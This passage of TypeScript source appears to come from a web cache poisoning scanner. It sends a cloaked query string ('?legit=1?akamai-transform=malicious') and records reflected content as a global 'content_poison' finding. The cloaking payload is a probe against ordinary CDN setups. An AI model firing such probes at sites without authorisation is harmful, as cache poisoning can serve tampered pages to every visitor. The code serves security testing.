          signals: { bodyReflection: true, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
          oracle: {} as any, classification: 'multi_cdn_mismatch', attackClass: 'content_poison', confidence: 'LIKELY',
          blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
        });
      }
    }
  }

  private async testParameterCloaking(url: string, headers: Record<string, string>): Promise<void> {
    const cloaked = `${url}?legit=1?akamai-transform=malicious`;
    const resp = await this.http.get(cloaked, headers);
    if (resp.status === 200 && resp.body.includes('malicious')) {
      this.findings.push({
        inputType: 'query', inputName: 'akamai-transform', canary: 'malicious',
        signals: { bodyReflection: true, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
        oracle: {} as any, classification: 'behaviour_poisoning', attackClass: 'content_poison', confidence: 'LIKELY',
        blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
      });
    }
  }

  private generateCanary(): string {
    return Math.random().toString(36).substring(2, 10);
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
